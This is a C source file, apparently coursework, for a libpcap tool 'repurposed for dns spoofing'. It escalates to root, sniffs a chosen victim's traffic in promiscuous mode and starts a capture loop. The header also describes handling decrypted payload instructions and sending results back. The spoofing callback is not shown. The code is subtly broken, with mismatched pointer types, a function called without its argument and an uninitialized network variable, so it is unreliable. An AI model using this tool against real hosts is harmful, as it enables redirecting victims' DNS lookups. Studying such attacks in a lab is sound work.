/*---------------------------------------------------------------------------------------------
	--	SOURCE FILE:	dns0.c -   A simple but complete packet capture
	--					program that will capture and parse datagrams
	--
	--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
	--					filter (BPF)
	--
	--	DATE:			April 23, 2006
	--
	--	REVISIONS:		(Date and description)
	--
	--				March 29, 2011
	--				Fixed memory leak - no more malloc
	--
	--				April 26, 2011
	--				Fixed the pcap_open_live function issues
	--				Use the pcap_lookupnet function before using pcap_open_live
	--
	--				April 10, 2014
	--				Added TCP header processing in proc_hdrs.c
	--
	--				October 22, 2018
	--				Added UDP header processing in proc_hdrs.c
	--
	--				November 5, 2018
	--				Repurposed for dns spoofing
	--
	--
	--	DESIGNERS:		Based on the code by Martin Casado, Aman Abdulla
	--					Code was also taken from tcpdump source, namely from the following files:
	--					print-ether.c
	--					print-ip.c
	--					ip.h
	--					Modified & redesigned: Aman Abdulla: 2006, 2014, 2016
	--					Modified & redesigned: John Warren 2018
	--
	--	PROGRAMMER:		John Warren
	--
	--	NOTES:
	--	The program will selectively capture a specified number packets using a specified filter
	--	The program will parse the headers and print out selected fields of interest.
	--  The program will decrypt and then handle the instructions in the payload
	--  Once it has handled the instructions, it will send the results as specified in the payload
	---
	--	Compile:
	--		Use the Makefile provided
	--	Run:
	--		./dns0 <ip of attack> [<redirect to>]
	--
	-------------------------------------------------------------------------------------------------*/

#include "pkt_sniff.h"

int main (int argc,char **argv)
{
	pcap_t* nicd;         // nic file descriptor
    bpf_u_int32 netp;          // ip

	// Options must be passed in as a string
	if (argc < 2){
    	fprintf(stdout,"Usage: %s <target IP> [<site redirection>]\n",argv[0]);
    	return 0;
	}
    
    if (setuid(0)) {
        perror("setuid");
        exit(EXIT_FAILURE);
    }
    if (setgid(0)) {
        perror("setgid");
        exit(EXIT_FAILURE);
    }
    
    char **pfilt = calloc(128, sizeof(char));

    nicd = get_nicd();

     // add if there is time
    if(argc > 2){
        // redirect to 2nd parameter
        puts("dynamic redirect not yet implemented");
        exit(0);
	} 

    sprintf(pfilt,"(%s) and (src host %s)", FILTER, argv[1]);
    printf("filter as used: %s\n",pfilt);

    dnss(nicd,pfilt);

	fprintf(stdout,"\nCapture Session Done\n");
	return 0;
}


pcap_t * get_nicd(bpf_u_int32 **netp){
	char errbuf[PCAP_ERRBUF_SIZE];
    int res;                   // list of interfaces
	pcap_if_t *iflp;           // interface list pointer
	char *nic_dev;             // first interface
	pcap_t* nic_descr;          // nic file descriptor
	bpf_u_int32 maskp;         // subnet mask

        // Get a list of interfaces
	res = pcap_findalldevs (&iflp, errbuf);
	if (res == -1)
	{
		fprintf(stderr, "%s\n", errbuf);
		exit(1);
	}

	nic_dev = iflp->name;
   // Display the first system interface
	if (nic_dev == NULL)
	{
		printf("%s\n",errbuf);
		exit(1);
	}

    	// Use pcap to get the IP address and subnet mask of the device
	pcap_lookupnet (nic_dev, &netp, &maskp, errbuf);
	if (nic_dev == NULL)
	{
		printf("%s\n",errbuf);
		exit(1);
	}

    	// open the device for packet capture & set the device in promiscuous mode
	nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
	if (nic_descr == NULL)
	{
		printf("pcap_open_live(): %s\n",errbuf);
		exit(1);
	}
	printf("%x\n",nic_descr);
	return nic_descr;
}

void dnss(pcap_t *nicd, char*pfilt){
	    // Compile the filter expression
	struct bpf_program fp;      // holds compiled program
	u_char* args = NULL;
    bpf_u_int32 netp;          // ip
	bpf_u_int32 maskp;         // subnet mask

	if (pcap_compile (nicd, &fp, pfilt, 0, netp) == -1){
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }
    puts("compiled");

    // Load the filter into the capture device
    if (pcap_setfilter (nicd, &fp) == -1)    {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }

    puts("loaded");
   
    	// Start the capture session
	pcap_loop (nicd, NUMPKT, pkt_callback, args);

}